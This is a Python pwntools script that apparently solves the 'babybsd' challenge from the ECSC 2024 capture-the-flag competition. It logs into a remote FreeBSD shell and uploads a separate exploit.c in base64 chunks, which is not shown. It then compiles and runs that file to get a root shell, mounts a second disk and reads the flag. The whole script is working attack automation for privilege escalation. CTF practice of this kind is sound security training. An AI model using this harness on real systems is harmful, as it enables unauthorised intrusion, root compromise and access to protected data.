#!/usr/bin/env python3

import os
import time
import base64
import logging

os.environ["PWNLIB_NOTERM"] = "1"

from pwn import remote

logging.disable()

HOST = os.environ.get("HOST", "babybsd.challs.external.open.ecsc2024.it")
PORT = int(os.environ.get("PORT", 38318))

POW_BYPASS = 'redacted'

io = remote(HOST, PORT)
io.sendlineafter(b"Result:", f"99:{POW_BYPASS}".encode())
io.sendlineafter(b"login:", b"user")
io.sendlineafter(b"Password:", b"user")
io.sendlineafter(b"Welcome to FreeBSD", b"")

expl = open(os.path.join(os.path.dirname(__file__), "exploit.c"), "r").read()

CHUNK_SIZE = 256
for i in range(0, len(expl), CHUNK_SIZE):
    chunk = expl[i : min(i + CHUNK_SIZE, len(expl))]
    chunk = base64.b64encode(chunk.encode()).decode()
    cmd = f"echo {chunk} | base64 -d  >> exploit.c".encode()
    io.sendlineafter(b"$ ", cmd)

io.sendlineafter(b"$ ", b"cc exploit.c -o exploit")
io.sendlineafter(b"$ ", b"./exploit")

io.recvuntil(b"eventfds created!")
io.recvline()

if b"reached userspace shell" in io.recvline():
    io.sendlineafter(b"$ ", b"./exploit SHELL")
    io.sendlineafter(b"# ", b"mkdir a")
    io.sendlineafter(b"# ", b"mount -t ext2fs /dev/ada1 a")
    io.sendlineafter(b"# ", b"cat a/flag")
    io.recvuntil(b"TeamItaly")
    flag = io.recvuntil(b"}").strip().decode()
    flag = f"TeamItaly{flag}"
    print(flag)
else:
    print("expl failed")

io.close()

